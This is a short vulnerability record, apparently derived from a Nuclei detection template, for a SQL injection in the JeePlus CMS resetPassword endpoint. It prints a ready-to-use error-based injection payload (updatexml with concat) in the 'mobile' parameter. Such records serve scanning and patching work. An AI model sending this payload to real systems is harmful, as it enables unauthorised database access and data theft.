# Vulnerability: JeePlus CMS - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`jeeplus-cms-resetpassword-sqli.yaml`)

## Description
A SQL injection vulnerability exists in the JeePlus low-code development platform, allowing attackers to manipulate database queries.This can lead to unauthorized data access, modification, or potential compromise of the application.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1))%23
```

